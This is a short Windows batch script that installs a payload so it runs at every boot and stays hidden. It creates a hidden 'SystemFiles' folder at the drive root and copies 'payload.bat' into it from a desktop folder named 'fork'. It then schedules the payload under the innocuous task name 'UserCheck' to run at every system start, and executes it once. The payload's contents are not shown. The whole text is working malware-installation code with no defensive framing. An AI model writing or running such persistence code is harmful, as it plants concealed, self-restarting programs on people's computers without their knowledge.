:: Variables declaration
set location="SystemFiles"


cd \
mkdir %location%
attrib +h %location%
cd %location%
copy /Y %UserProfile%\Desktop\fork\payload.bat payload.bat
SchTasks /create /tn "UserCheck" /tr c:\SystemFiles\payload.bat /sc onstart
CALL payload.bat

TIMEOUT /T 10